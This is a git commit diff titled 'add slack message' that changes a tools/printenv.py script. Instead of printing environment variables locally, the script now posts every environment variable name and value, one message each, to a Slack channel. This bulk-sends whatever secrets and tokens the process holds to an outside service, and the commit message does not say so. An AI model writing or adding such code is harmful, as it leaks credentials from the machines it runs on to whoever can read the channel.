7d82f41c28c295ca5ba446d1c65ff70d1f00e676
Deon Saunders <51129091+degrasse-python@users.noreply.github.com>
2024-10-22 06:52:11 -0700

    add slack message

--- tools/printenv.py
+++ tools/printenv.py
@@ -1,18 +1,41 @@
 import os
 import json 
+import logging
+
+from slack_sdk import WebClient
+from slack_sdk.errors import SlackApiError
 
 from tools.utils import *
+
+logger = logging.getLogger(__name__)
 
 THREAD_TS = os.environ.get('SLACK_THREAD')
 CHANNEL_ID = os.environ.get('SLACK_CHANNEL')
 SLACK_TOKEN = os.environ.get('SLACK_API_TOKEN')
 
 
-# Example usage
+client = WebClient(token=os.environ.get("SLACK_BOT_TOKEN"))
 initial_comment = (f"Getting all the envs for this teammate'")
+
+
+try: 
+  result = client.chat_postMessage(
+      channel=CHANNEL_ID,
+      text=initial_comment
+  )
+
+
+  for name, value in os.environ.items():
+      result = client.chat_postMessage(
+        channel=CHANNEL_ID,
+        text="{0}: {1}".format(name, value)
+          )
+
+except SlackApiError as e:
+    print(f"Error: {e}")
+
+# Example usage
 # do something with the data
 
-for name, value in os.environ.items():
-    print("{0}: {1}".format(name, value))
 
 
